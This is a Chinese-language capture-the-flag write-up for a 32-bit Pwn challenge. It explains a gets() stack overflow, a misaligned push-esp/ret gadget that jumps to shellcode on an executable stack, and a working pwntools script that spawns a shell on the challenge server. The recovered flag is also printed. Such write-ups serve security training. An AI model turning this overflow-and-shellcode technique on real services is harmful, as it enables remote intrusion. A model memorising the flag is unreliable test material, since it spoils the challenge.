# PHM #63 Pwn — toooomuch-2

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 100 |
| 連線 | `nc ctf.hackme.quest 7702` (與 #62 同一支 binary) |
| 檔案 | [`/static/toooomuch`](https://ctf.hackme.quest/static/toooomuch) |
| 提示 | Get a shell, please. Buffer overflow, 0x8048560, shellcode |
| 保護 | No canary, No PIE, GNU_STACK = RWE (**stack 可執行**) |

## 分析

同 [#62](toooomuch.md) 的 `gets(buf@ebp-0x18)` 溢位, 到 return address 距離 `28`。這次要真正的 shell → `cat flag` (真 flag, 不是 fake_flag)。

stack 是 RWE → 可以把 shellcode 放 stack 執行。問題是 stack 位址有 ASLR, 不能直接寫死。提示給了 `0x8048560`:

```
804855c: e8 7f ff ff ff   call __libc_start_main
8048560: ff f4            ← 從這裡開始「錯位」解碼
8048562: 66 90 ...        nop
8048570: 8b 1c 24         mov ebx, [esp]
8048573: c3               ret
```

從 `0x8048560` 錯位解碼是 `push esp ; (nops) ; mov ebx,[esp] ; ret`：
- `toooomuch` 的 `ret` 彈出 `0x8048560` 後, `esp` 正好指向我們放在 return address **後面**的 shellcode。
- `push esp` 把這個 `esp` 值壓進堆疊, 最後 `ret` 把它彈回 `eip` → **跳到 shellcode**。

等於用一個現成位址做到 `jmp esp` 的效果 (binary 裡沒有真正的 `jmp esp`/`call esp`), 完全不需要 leak stack 位址。

## 解法

```python
from pwn import *
context(arch='i386', os='linux')
sc = asm(shellcraft.i386.linux.sh())     # execve("/bin/sh"), 無 \n
r=remote('ctf.hackme.quest',7702)
r.sendline(b'A'*28 + p32(0x8048560) + sc)
r.sendline(b'cat flag'); print(r.recvall(timeout=5))
```

(payload 不能含 `\n`, 否則 `gets` 截斷; shellcode 選無換行的版本。)

## Flag

```
FLAG{Buffer overflow is pretty easy, right?...MbIfR7p9sbKbwPSp}
```

## 感想

這題的精髓是那個 `0x8048560` 錯位 gadget: 沒有 `jmp esp` 也能靠「`push esp; …; ret`」把控制流導到緊接 return address 之後的 shellcode, 繞過 stack ASLR。stack 可執行 (`GNU_STACK` RWE) 是這招成立的前提。
